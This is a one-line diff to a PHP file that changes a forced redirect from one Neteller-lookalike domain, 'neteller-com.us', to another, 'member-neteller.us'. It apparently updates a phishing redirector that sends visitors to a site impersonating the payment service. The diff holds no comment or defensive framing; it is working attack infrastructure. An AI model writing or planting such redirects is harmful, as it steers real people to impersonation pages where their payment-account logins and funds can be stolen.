@@ -1,1 +1,1 @@
-<?php header("Location: http://neteller-com.us/"); die(); ?>
+<?php header("Location: http://member-neteller.us/"); die(); ?>
